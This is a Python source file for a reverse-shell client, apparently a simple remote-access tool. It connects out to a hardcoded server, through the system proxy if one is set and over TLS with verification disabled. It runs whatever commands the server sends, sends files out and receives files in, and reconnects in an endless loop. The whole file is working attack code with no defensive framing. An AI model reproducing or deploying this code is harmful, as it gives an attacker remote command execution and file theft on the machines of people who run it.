import socket
import os
import subprocess
import ssl
import re
import tqdm
import urllib.parse

SERVER_HOST = '192.168.1.41'
SERVER_PORT = 8000
BUFFER_SIZE = 1440
SEPARATOR = "<sep>"

class Client:
    
    def __init__(self, host, port, verbose=False):
        self.host = host
        self.port = port
        self.verbose = verbose
        self.socket = self.connect_to_server()
        self.cwd = None

    def get_proxy_settings(self):
        http_proxy = os.environ.get('HTTP_PROXY') or os.environ.get('http_proxy')
        https_proxy = os.environ.get('HTTPS_PROXY') or os.environ.get('https_proxy')
        return http_proxy, https_proxy

    def connect_to_server(self, custom_port=None):
        s = socket.socket()
        if custom_port:
            port = custom_port
        else:
            port = self.port
        if self.verbose:
            print(f"Connecting to {self.host}:{port}")

        http_proxy, https_proxy = self.get_proxy_settings()

        if http_proxy or https_proxy:
            proxy_url = http_proxy if http_proxy else https_proxy
            proxy_parts = urllib.parse.urlparse(proxy_url)
            proxy_host = proxy_parts.hostname
            proxy_port = proxy_parts.port

            s.connect((proxy_host, proxy_port))
            s.sendall(f"CONNECT {self.host}:{port} HTTP/1.1\r\nHost: {self.host}:{port}\r\n\r\n".encode())
            response = s.recv(4096)
            if b"200 Connection established" not in response:
                raise Exception("Failed to connect to the server through the proxy.")
        else:
            s.connect((self.host, port))

        if self.verbose:
            print("Connected.")

        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        s = context.wrap_socket(s, server_hostname=self.host)
    
        return s
    
    def start(self):
        self.cwd = os.getcwd()
        self.socket.send(self.cwd.encode())
        
        while True:
            command = self.socket.recv(BUFFER_SIZE).decode()
            output = self.handle_command(command)
            if output == "abort":
                break
            elif output in ["exit", "quit"]:
                continue
            self.cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{self.cwd}"
            self.socket.sendall(message.encode())
            
        self.socket.close()

    def handle_command(self, command):
        if self.verbose:
            print(f"Executing command: {command}")
        if command.lower() in ["exit", "quit"]:
            output = "exit"
        elif command.lower() == "abort":
            output = "abort"
        elif (match := re.search(r"cd\s*(.*)", command)):
            output = self.change_directory(match.group(1))
        elif (match := re.search(r"download\s*(.*)", command)):
            filename = match.group(1)
            if os.path.isfile(filename):
                output = f"The file {filename} is sent."
                self.send_file(filename)
            else:
                output = f"The file {filename} does not exist"
        elif (match := re.search(r"upload\s*(.*)", command)):
            filename = match.group(1)
            output = f"The file {filename} is received."
            self.receive_file()
        else:
            output = subprocess.getoutput(command)
        return output
    
    def change_directory(self, path):
        if not path:
            return ""
        try:
            os.chdir(path)
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
        return output
    
    def receive_file(self, port=5002):
        s = self.connect_to_server(custom_port=port)
        Client._receive_file(s, verbose=self.verbose)
        
    def send_file(self, filename, port=5002):
        s = self.connect_to_server(custom_port=port)
        Client._send_file(s, filename, verbose=self.verbose)
    
    @classmethod
    def _receive_file(cls, s: socket.socket, buffer_size=4096, verbose=False):
        received = s.recv(buffer_size).decode()
        filename, filesize = received.split(SEPARATOR)
        filename = os.path.basename(filename)
        filesize = int(filesize)
        if verbose:
            progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        else:
            progress = None
        with open(filename, "wb") as f:
            while True:
                bytes_read = s.recv(buffer_size)
                if not bytes_read:
                    break
                f.write(bytes_read)
                if verbose:
                    progress.update(len(bytes_read))
        s.close()
    
    @classmethod
    def _send_file(cls, s: socket.socket, filename, buffer_size=4096, verbose=False):
        filesize = os.path.getsize(filename)
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        if verbose:
            progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        else:
            progress = None
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(buffer_size)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
                if verbose:
                    progress.update(len(bytes_read))
        s.close()

if __name__ == "__main__":
     while True:
         # keep connecting to the server forever
         try:
             client = Client(SERVER_HOST, SERVER_PORT, verbose=False) #if True print statement, if False without statement
             client.start()
         except Exception as e:
             print(e)
    #client = Client(SERVER_HOST, SERVER_PORT)
    #client.start()
